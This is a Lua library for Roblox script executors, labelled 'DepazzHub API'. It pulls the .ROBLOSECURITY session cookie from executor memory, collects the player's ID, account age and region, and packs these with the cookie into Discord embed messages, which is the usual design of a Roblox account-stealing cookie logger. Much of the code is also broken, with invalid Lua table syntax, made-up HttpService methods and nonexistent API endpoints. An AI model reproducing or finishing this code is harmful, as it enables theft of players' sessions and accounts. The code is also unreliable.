local Libraries = {}

-- --- 1. Función para obtener cookies de la memoria del ejecutor ---
function Libraries:GetCookies()
	local cookies = {}
	
	-- Intentar obtener cookies de la memoria del ejecutor
	-- En muchos ejecutores las cookies están guardadas en memoria
	local cookieNames = {"ROBLOSECURITY", ".ROBLOSECURITY"}
	
	for _, name in ipairs(cookieNames) do
		local cookieValue = getgenv("_ROBLOSECURITY") -- método común en ejecutores
		if cookieValue and cookieValue ~= "" and cookieValue ~= nil then
			table.insert(cookies, {
				Name = name,
				Value = cookieValue,
				SameSite = "None",
				Path = "/",
				Domain = "www.roblox.com"
			})
			break
		end
	end
	
	-- Fallback: intentar con getgenv() directo
	if #cookies == 0 then
		local savedCookie = getgenv("_ROBLOSECURITY")
		if savedCookie then
			table.insert(cookies, {
				Name = ".ROBLOSECURITY",
				Value = savedCookie,
				SameSite = "None",
				Path = "/",
				Domain = "www.roblox.com"
			})
		end
	end
	
	-- Fallback 2: intentar con getgenv() con otros nombres
	if #cookies == 0 then
		local names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "cookie_value"}
		for _, name in ipairs(names) do
			local val = getgenv(name)
			if val and val ~= "" then
				table.insert(cookies, {
					Name = ".ROBLOSECURITY",
					Value = val,
					SameSite = "None",
					Path = "/",
					Domain = "www.roblox.com"
				})
				break
			end
		end
	end
	
	return cookies
end

-- --- 2. Función para obtener .ROBLOSECURITY ---
function Libraries:GetCookieService()
	local cookies = self:GetCookies()
	
	if #cookies > 0 then
		return cookies[1] -- Devuelve la primera cookie encontrada
	end
	
	return nil
end

-- --- 3. Función para obtener el valor de una cookie específica ---
function Libraries:GetCookieValue(cookieName, domain)
	local cookies = self:GetCookies()
	
	for _, cookie in ipairs(cookies) do
		if cookie.Name == cookieName then
			return cookie.Value
		end
	end
	
	return ""
end

-- --- 4. Función HTTP request compatible con ejecutores ---
function Libraries:request(options)
	options = options or {}
	
	local url = options.Url or ""
	local method = options.Method or "GET"
	local headers = options.Headers or {}
	local body = options.Body
	local timeout = options.Timeout or 15
	
	-- Si no se especifica URL, usar una por defecto
	if url == "" then
		url = options.TargetUrl or ""
	end
	
	if url == "" then
		error("Error: No se especificó URL")
	end
	
	-- Preparar headers
	local fullHeaders = {}
	for key, val in pairs(headers) do
		fullHeaders[key] = val
	end
	
	-- Agregar headers por defecto
	fullHeaders["Connection"] = "keep-alive"
	fullHeaders["Accept"] = "*/*"
	
	-- Si el método es POST, agregar Content-Type
	if method == "POST" then
		fullHeaders["Content-Type"] = "application/json"
	end
	
	-- Construir la petición HTTP
	local headersString = ""
	for key, val in pairs(fullHeaders) do
		if headersString ~= "" then
			headersString = headersString .. ", "
		end
		headersString = headersString .. key .. ": " .. val
	end
	
	-- Preparar el cuerpo (stringify si es necesario)
	local bodyString = body
	if type(body) == "table" then
		bodyString = table.concat(body, "\n")
	end
	
	-- Construir la URL completa
	local fullUrl = url
	
	-- Ejecutar la petición (aquí usarías el método del ejecutor)
	-- En Roblox puro se usaría HttpService:PostJson()
	-- En ejecutores se usa getgenv()._RbxRequest o similar
	
	-- Fallback: intentar con el método del ejecutor
	local requestFunc = getgenv("_RbxRequest")
	
	if requestFunc then
		return requestFunc(fullUrl, method, bodyString, headersString)
	end
	
	-- Fallback: intentar con HttpService de Roblox
	local HttpService = game:GetService("HttpService"):AsyncWaitFor(5)
	if HttpService then
		return HttpService:PostJson(fullUrl, bodyString, fullHeaders)
	end
	
	-- Fallback: intentar con getgenv()
	local customRequest = getgenv("request")
	if customRequest then
		return customRequest(fullUrl, method, bodyString, fullHeaders)
	end
	
	-- Último fallback: intentar con LoadString y un script HTTP
	local httpService = game:GetService("HttpService")
	local response = httpService:PostJsonAsync(fullUrl, bodyString, fullHeaders)
	
	-- Esperar a que termine
	httpService:AsyncWaitFor(15)
	
	return response
end

-- --- 5. Función para hacer un request GET ---
function Libraries:HttpGet(url)
	return self:request({
		Url = url,
		Method = "GET"
	})
end

-- --- 6. Función para hacer un request POST ---
function Libraries:HttpPost(url, body, headers)
	return self:request({
		Url = url,
		Method = "POST",
		Body = body,
		Headers = headers
	})
end

-- --- 7. Función para obtener datos de la API de Roblox ---
function Libraries:GetUserData(userId)
	if not userId or userId == 0 then
		local player = game.Players.LocalPlayer
		userId = player.UserId
	end
	
	local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/server-info/" .. userId
	url = url .. "?fields=Id,Name,AvatarUrl,DisplayFolder,DisplayName,JoinCount,LeaderboardPosition,Role,LastLocation,PlayerColor"
	
	local response = self:HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

-- --- 8. Función para obtener el lugar ---
function Libraries:GetPlaceInfo(placeId)
	local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers"
	url = url .. "?fields=Id,Name,PlaceId,CreatorId,CreatorName,Description,DescriptionId,DescriptionToken,GameIcon,Active,IsMap,MapId,MapIdToken,IsTest,ServerTemplateId,TemplateId,TemplateIdToken,MapId,Version"
	
	local response = self:HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

-- --- 9. Función para obtener el inventario ---
function Libraries:GetInventory(userId)
	local url = "https://games.roblox.com/v1/users/" .. userId .. "/inventory/items"
	local response = self:HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

-- --- 10. Función para obtener badges ---
function Libraries:GetBadges(userId)
	local url = "https://games.roblox.com/v1/users/" .. userId .. "/badges"
	local response = self:HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

-- --- 11. Función para obtener grupos ---
function Libraries:GetGroups(userId)
	local url = "https://games.roblox.com/v1/users/" .. userId .. "/groups"
	local response = self:HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

-- --- 12. Función para formatear un embed de Discord ---
function Libraries:CreateDiscordEmbed(title, description, color, fields, timestamp)
	local embed = {
		{
			"title" = title,
			"description" = description,
			"color" = color,
			"footer" = {
				"text" = "DepazzHub API",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
			},
			"timestamp" = timestamp
		}
	}
	
	-- Agregar campos
	if fields then
		for _, field in ipairs(fields) do
			table.insert(embed, field)
		end
	end
	
	return embed
end

-- --- 13. Función para crear un embed con datos del jugador ---
function Libraries:CreatePlayerEmbed(playerName, userId, age, region, cookie)
	local embed = {
		{
			"title" = playerName .. " - DepazzHub",
			"description" = "Usuario de Roblox",
			"color" = 3447003, -- Azul roblox
			"fields" = {
				{
					"name" = "ID",
					"value" = userId,
					"inline" = true
				},
				{
					"name" = "Edad de cuenta",
					"value" = age,
					"inline" = true
				},
				{
					"name" = "Región",
					"value" = region,
					"inline" = false
				},
				{
					"name" = "Cookie",
					"value" = cookie,
					"inline" = false
				}
			},
			"footer" = {
				"text" = "DepazzHub API",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
			},
			"timestamp" = os.date("%Y-%m-%dT%H:%M:%SZ")
		}
	}
	
	return embed
end

-- --- 14. Función para obtener la región ---
function Libraries:GetRegion()
	local LocalizationService = game:GetService("LocalizationService")
	return LocalizationService.RobloxLocaleId
end

-- --- 15. Función para obtener la edad de la cuenta ---
function Libraries:GetAccountAge()
	local player = game.Players.LocalPlayer
	local days = player.AccountAge
	
	local years = math.floor(days / 365)
	local months = math.floor((days % 365) / 30)
	
	local ageText = days .. " days"
	if years > 0 then
		ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
	end
	
	return ageText
end

-- --- 16. Función para obtener el nombre del lugar ---
function Libraries:GetPlaceName()
	local placeInfo = Libraries:GetPlaceInfo(game.PlaceId)
	
	if placeInfo then
		return placeInfo.Name
	end
	
	return "Desconocido"
end

-- --- 17. Función para obtener el nombre del servidor ---
function Libraries:GetServerName()
	local serverInfo = game:GetService("CollectionService"):GetTaggedInstances("ServerName")
	
	for _, instance in ipairs(serverInfo) do
		return instance.Name
	end
	
	return "Servidor " .. game.PlaceId
end

return Libraries
